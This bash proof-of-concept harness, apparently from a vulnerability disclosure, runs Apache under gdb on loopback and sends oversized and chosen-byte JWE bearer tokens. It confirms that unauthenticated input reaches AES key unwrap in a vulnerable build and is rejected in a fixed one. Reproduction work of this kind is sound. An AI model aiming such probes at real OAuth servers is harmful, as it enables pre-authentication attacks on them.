#!/bin/bash
# W212: unauthenticated loopback bearer-JWE reachability in a real consumer.
# Three lanes: vulnerable oversized/safe, chosen-byte post-unwrap dump, fixed
# oversized/safe. Private listeners on 127.0.0.1:18444 and :18445 only.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE"
E="$HERE/evidence"
GDBPIDS=""
PASS=0
FAIL=0

cleanup() {
    for pf in apache-oauth-bearer.pid apache-oauth-bearer-fixed.pid; do
        if [ -f "$pf" ]; then kill "$(cat "$pf")" 2>/dev/null || true; rm -f "$pf"; fi
    done
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
    [ -n "${RUN:-}" ] && rm -rf "$RUN"
}
trap cleanup EXIT INT TERM

check() {
    if [ "$2" = "$3" ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
    printf 'CHECK %-32s observed=%s expected=%s\n' "$1" "$2" "$3"
}

start() {
    conf=$1; cmd=$2; out=$3; port=$4
    timeout 120 gdb -q -batch -x "$cmd" --args /usr/sbin/apache2 -f "$conf" -X \
        > "$out" 2>&1 &
    GDBPIDS="$GDBPIDS $!"
    i=0
    while [ "$i" -lt 100 ]; do
        if ss -ltn "sport = :$port" | grep -q ":$port"; then return 0; fi
        i=$((i + 1))
    done
    echo "LISTENER_NOT_READY=$port" >&2
    exit 2
}

stop_gdb() {
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
    GDBPIDS=""
    sleep 1
}

probe() {
    port=$1; tag=$2; len=$3; kek=$4
    if [ "$kek" = none ]; then
        W2_PORT="$port" W2_TAG="$tag" ./probe-oauth-bearer.py "$len"
    else
        W2_PORT="$port" W2_TAG="$tag" W2_KEK="$kek" ./probe-oauth-bearer.py "$len"
    fi
}

rm -rf /tmp/w2-apache-oauth-bearer-run /tmp/w2-oidc-cache-oauth-bearer \
       /tmp/w2-apache-oauth-bearer-fixed-run /tmp/w2-oidc-cache-oauth-bearer-fixed
mkdir -p /tmp/w2-apache-oauth-bearer-run /tmp/w2-oidc-cache-oauth-bearer \
         /tmp/w2-apache-oauth-bearer-fixed-run /tmp/w2-oidc-cache-oauth-bearer-fixed
mkdir -p "$HERE/html"
: > "$E/oauth-bearer-fixed-apache_error.log"
RUN=$(mktemp -d /tmp/w212-oauth-bearer-XXXXXX)
for t in apache-oauth-bearer.conf apache-oauth-bearer-fixed.conf \
         gdb-oauth-bearer.cmd gdb-oauth-bearer-chosen.cmd \
         gdb-oauth-bearer-fixed.cmd; do
    sed "s|@HERE@|$HERE|g" "$HERE/$t" > "$RUN/$t"
done
check PORTS_FREE "$(ss -ltn | grep -cE ':1844[45] ' || true)" 0

start "$RUN/apache-oauth-bearer.conf" "$RUN/gdb-oauth-bearer.cmd" \
      "$E/oauth-bearer-apache-stdout.log" 18444
probe 18444 oauth-bearer 56 none
probe 18444 oauth-bearer 40 none
sleep 2
stop_gdb
VLOG="$E/oauth-bearer-gdb.log"
check VULN_KW_HITS "$(grep -c W2B_AES_KW_DECRYPT_REACHED "$VLOG" || true)" 2
check VULN_UNWRAP_HITS "$(grep -c W2B_AES_UNWRAP_KEY_REACHED "$VLOG" || true)" 2
check VULN_OVERSIZED_FIRST "$(grep -n W2B_AES_KW_DECRYPT_REACHED "$VLOG" | head -1 | grep -c 'raw_len=56' || true)" 1

start "$RUN/apache-oauth-bearer.conf" "$RUN/gdb-oauth-bearer-chosen.cmd" \
      "$E/oauth-bearer-chosen-apache-stdout.log" 18444
probe 18444 oauth-bearer-chosen 56 30313233343536373839616263646566
sleep 2
stop_gdb
CLOG="$E/oauth-bearer-chosen-gdb.log"
check CHOSEN_POST_UNWRAP "$(grep -c W2BC_POST_UNWRAP "$CLOG" || true)" 1
check CHOSEN_BYTES "$(grep -c '0x4d.*0x49.*0x53.*0x48.*0x45.*0x2d.*0x57.*0x32' "$CLOG" || true)" 1

start "$RUN/apache-oauth-bearer-fixed.conf" "$RUN/gdb-oauth-bearer-fixed.cmd" \
      "$E/oauth-bearer-fixed-apache-stdout.log" 18445
probe 18445 oauth-bearer-fixed 56 none
check FIXED_56_INVALID_ARG "$(grep -c 'line: 599' "$E/oauth-bearer-fixed-apache_error.log" || true)" 1
probe 18445 oauth-bearer-fixed 40 none
sleep 2
stop_gdb
FLOG="$E/oauth-bearer-fixed-gdb.log"
check FIXED_56_NO_UNWRAP "$(grep -c W2BF_AES_UNWRAP_KEY_REACHED "$FLOG" || true)" 1
check FIXED_KW_HITS "$(grep -c W2BF_AES_KW_DECRYPT_REACHED "$FLOG" || true)" 2

printf 'REPLAY_OAUTH_BEARER: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
